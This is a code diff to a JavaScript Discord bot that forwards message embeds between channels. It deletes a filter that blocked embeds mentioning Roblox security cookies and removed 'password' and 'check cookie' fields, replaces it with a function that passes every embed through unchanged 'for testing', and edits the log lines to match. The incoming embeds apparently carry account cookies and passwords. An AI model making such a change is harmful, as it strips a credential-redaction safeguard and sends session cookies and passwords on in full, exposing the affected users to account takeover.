@@ -118,54 +118,11 @@ client.on('guildUnavailable', (guild) => {
     // Server might be temporarily down or deleted
 });
 
-// Function to filter sensitive information from embeds
+// Function to pass through embeds without filtering (for testing)
 function filterSensitiveInfo(embed) {
     if (!embed) return null;
-
-    // Check if embed contains robloxsecurity - if so, don't forward at all
-    const embedString = JSON.stringify(embed).toLowerCase();
-    if (embedString.includes('robloxsecurity')) {
-        console.log('Embed contains robloxsecurity - not forwarding');
-        return null;
-    }
-
-    // Create a copy of the embed
-    let filteredEmbed = { ...embed };
-
-    // Filter out sensitive fields from embed data
-    if (filteredEmbed.fields) {
-        filteredEmbed.fields = filteredEmbed.fields.filter(field => {
-            const fieldName = field.name.toLowerCase();
-            const fieldValue = field.value.toLowerCase();
-            
-            // Remove Check Cookie and Password fields
-            if (fieldName.includes('check cookie') || 
-                fieldName.includes('password') ||
-                fieldValue.includes('check cookie') ||
-                fieldValue.includes('password')) {
-                return false;
-            }
-            
-            return true;
-        });
-    }
-
-    // Filter description if it contains sensitive info
-    if (filteredEmbed.description) {
-        const desc = filteredEmbed.description.toLowerCase();
-        if (desc.includes('check cookie') || desc.includes('password')) {
-            // Remove sensitive lines from description
-            filteredEmbed.description = filteredEmbed.description
-                .split('\n')
-                .filter(line => {
-                    const lowLine = line.toLowerCase();
-                    return !lowLine.includes('check cookie') && !lowLine.includes('password');
-                })
-                .join('\n');
-        }
-    }
-
-    return filteredEmbed;
+    // Return the embed as-is without any filtering
+    return embed;
 }
 
 // Listen for new messages to forward embeds
@@ -219,7 +176,7 @@ client.on('messageCreate', async (message) => {
             const filteredEmbed = filterSensitiveInfo(embed);
             
             if (!filteredEmbed) {
-                console.log('Embed filtered out due to sensitive content');
+                console.log('Embed was null - skipping');
                 continue;
             }
 
@@ -272,7 +229,7 @@ client.on('messageCreate', async (message) => {
                 embeds: [forwardedEmbed]
             });
 
-            console.log(`Embed forwarded to destination channel (filtered sensitive info)`);
+            console.log(`Embed forwarded to destination channel (no filtering applied)`);
         }
 
     } catch (error) {
